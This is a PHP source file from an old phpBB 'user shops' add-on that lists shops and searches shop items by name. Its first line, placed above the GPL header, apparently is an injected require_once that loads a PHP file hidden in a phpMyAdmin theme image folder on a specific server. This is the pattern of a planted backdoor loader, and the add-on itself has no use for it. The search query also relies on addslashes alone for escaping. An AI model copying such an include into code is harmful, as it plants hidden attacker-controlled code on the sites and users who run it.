<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                              shop_users.php
 *                            -------------------
 *   Version              : 2.0.1
 *   website              : http://www.zarath.com
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   Copyright (C) 2004-2006   Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.' . $phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management
//
if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }

#
# Check if shops are open or closed.
#
if ( !($board_config['u_shops_enabled']) )
{
	message_die(GENERAL_MESSAGE, $lang['ushop_shops_closed']);
}

#
# Register page variables... Search & Action
#
if ( isset($HTTP_GET_VARS['action']) || isset($HTTP_POST_VARS['action']) ) { $action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action']; }
else { $action = ''; }

if ( isset($HTTP_GET_VARS['search_string']) || isset($HTTP_POST_VARS['search_string']) ) { $search_string = ( isset($HTTP_POST_VARS['search_string']) ) ? $HTTP_POST_VARS['search_string'] : $HTTP_GET_VARS['search_string']; }
else { $search_string = ''; }
#
# End registration of variables
#

//default page
if ( empty($action) )
{
	$template->set_filenames(array(
		'body' => 'shop/shop_users_body.tpl')
	);

	if ( !empty($search_string) )
	{
		$search_string = addslashes(stripslashes($search_string));

		$sql = "SELECT DISTINCT a.*, b.shop_id, count(b.id) as item_count
			FROM " . USER_SHOPS_TABLE . " a, " . USER_SHOP_ITEMS_TABLE . " b, " . SHOP_ITEMS_TABLE . " c
			WHERE ( ( (a.shop_status = 0 OR a.shop_status = 2) AND a.id = b.shop_id )
				AND ( b.item_id = c.id )
				AND ( c.name LIKE '%" . $search_string . "%' ) )
			GROUP BY b.shop_id
			ORDER BY `shop_updated` DESC";
	}
	else
	{
		$sql = "SELECT DISTINCT a.*, b.shop_id, count(b.id) as item_count
			FROM " . USER_SHOPS_TABLE . " a, " . USER_SHOP_ITEMS_TABLE . " b
			WHERE ( (a.shop_status = 0 OR a.shop_status = 2) AND a.id = b.shop_id )
			GROUP BY b.shop_id
			ORDER BY `shop_updated` DESC";
	}
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shops'), '', __LINE__, __FILE__, $sql);
	}

	$sql_num_rows = $db->sql_numrows($result);

	for ($i = 0; $i < $sql_num_rows; $i++)
	{

		if ( !($row = $db->sql_fetchrow($result)) )
		{
			message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shops'), '', __LINE__, __FILE__, $sql);
		}

		$rownum = ( $i % 2 ) ? "row1" : "row2";

		if ( $row['item_count'] )
		{
			$template->assign_block_vars('shop_row', array(
				'ROW_CLASS' => $rownum,
				'SHOP_URL' => append_sid("shop_users_view.php?shop=" . $row['id']),
				'SHOP_NAME' => $row['shop_name'],
				'SHOP_TYPE' => $row['shop_type'],
				'SHOP_OWNER' => $row['username'])
			);
		}
	}

	if ( !($sql_num_rows) )
	{
		$msg = ( empty($search_string) ) ? $lang['ushop_none_opened'] : $lang['ushop_no_items_found'];

		$template->assign_block_vars('switch_no_shops', array(
			'MSG' => $msg
		));
	}
	else
	{
		$template->assign_block_vars('switch_is_shops', array());
	}

	#
	# Code to handle replacement of msg edit/create
	$sql = "SELECT *
		FROM " . USER_SHOPS_TABLE . "
		WHERE user_id = '{$userdata['user_id']}'";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shops'), '', __LINE__, __FILE__, $sql);
	}
	$user_shop_msg = ( $db->sql_numrows($result) ) ? $lang['ushop_edit_shop'] : $lang['ushop_open_own_shop'];

	$template->assign_block_vars('switch_user_shop', array(
		'USER_MSG' => sprintf($lang['ushop_u_click'], '<a href="' . append_sid('shop_users_edit.php') . '" class="nav">', '</a>', $user_shop_msg)
	));

	$page_title = $row['name'] . ' ' . $lang['ushop_information'];
	$shoplocation = ' -> <a href="'.append_sid('shop_users.'.$phpEx, true).'" class="nav">' . $lang['ushop_shop_list'] . '</a>';

	$template->assign_vars(array(
		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']),

		'USER_POINTS' => $userdata['user_points'],
		'SHOPLOCATION' => $shoplocation,
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],

		'L_INVENTORY' => $lang['your_inv'],
		'L_POINTS_NAME' => $board_config['points_name'],
		'L_SEARCH_TITLE' => 'Search User Shops',
		'L_FIND_ITEM' => 'Find Item',
		'L_SHOP_OWNER' => $lang['shop_owner'],
		'L_SHOP_TYPE' => $lang['shop_type'],
		'L_SHOP_NAME' => $lang['shop_name'],
		'L_SHOP_TITLE' => $lang['ushop_shop_list']));

	$template->assign_block_vars('', array());
}

//
// Start output of page
//
include($phpbb_root_path . 'includes/page_header.' . $phpEx);

//
// Generate the page
//
$template->pparse('body');

include($phpbb_root_path . 'includes/page_tail.' . $phpEx);

?>